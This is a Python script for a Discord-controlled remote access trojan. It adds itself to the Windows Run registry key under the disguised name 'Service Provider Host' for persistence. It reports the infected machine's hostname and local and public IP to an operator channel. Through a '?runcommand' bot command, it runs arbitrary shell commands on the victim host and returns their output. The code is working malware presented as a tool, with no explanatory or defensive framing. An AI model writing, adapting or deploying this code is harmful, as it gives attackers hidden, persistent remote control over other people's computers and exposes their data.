import discord
from discord.ext import commands
from discord import File
import os
import socket
import requests
import subprocess
import winreg

def create_key(name: str, path: str)->bool:
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
        
        value, _ = winreg.QueryValueEx(reg_key, name)

        winreg.CloseKey(reg_key)
        return False
    except:
        reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                                    r'Software\Microsoft\Windows\CurrentVersion\Run', 
                                    0, 
                                    winreg.KEY_WRITE)

        if not reg_key:
            return False

        winreg.SetValueEx(reg_key, 
            name,                  
            0,                     
            winreg.REG_SZ,     
            path)
        
        reg_key.Close()
        return True


create_key('Service Provider Host',f"{__file__}")


PUBLICIP = requests.get('https://api.ipify.org').text

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(intents=intents,command_prefix="?")

BOT_TOKEN = "" #bot token#

# // CHANNELS \\ #
BOTS_CHANNEL = 0 # Channel ID #

@bot.event
async def on_ready():
    channel = bot.get_channel(BOTS_CHANNEL)
    await channel.send(embeds=[discord.Embed(description=f"**BOT ONLINE** HOST: **{socket.gethostname()}** LOCAL IP: **{socket.gethostbyname(socket.gethostname())}** PUBLIC IP: ||**{PUBLICIP}**||",color=0x3498DB)])

@bot.command()
async def bots(ctx):
    await ctx.send(embeds=[discord.Embed(description=f"**BOT** HOST: **{socket.gethostname()}** LOCAL IP: **{socket.gethostbyname(socket.gethostname())}** PUBLIC IP: ||**{PUBLICIP}**||",color=0x3498DB)])

@bot.command()
async def runcommand(ctx, *, command):
    try:
        lexedcommand = command.split(" ")
        
        for item in lexedcommand:
            if item == "" or item == " ":
                lexedcommand.remove(item)
        
        if lexedcommand[0] == socket.gethostname():
            FullCommand = ""
            
            for i, x in enumerate(lexedcommand):
                if i > 0:
                    FullCommand = FullCommand + " " + x
            
            output = subprocess.check_output(FullCommand, shell=True)
            
            filteredoutput = ""
            SendMessage = True
            
            
            for i,letter in enumerate(output.decode('ASCII')):
                if i > 1900:
                    break
                filteredoutput += letter
            
            if SendMessage:
                output = filteredoutput
                
                if output == "":
                    await ctx.send(embeds=[discord.Embed(description=f"```NO OUTPUT```",color=0x3498DB,title=f"HOST OUTPUT | ||{socket.gethostname()}|| |")])
                    return
                
                await ctx.send(embeds=[discord.Embed(color=0x3498DB,title=f"HOST OUTPUT | ||{socket.gethostname()}|| |")])
                await ctx.send(f"```{output}```")
    except:
        await ctx.send(embeds=[discord.Embed(description=f"```FAILD TO RUN COMMAND```",color=0x3498DB,title=f"HOST OUTPUT | ||{socket.gethostname()}|| |")])

bot.run(BOT_TOKEN,root_logger=True,log_handler=None)



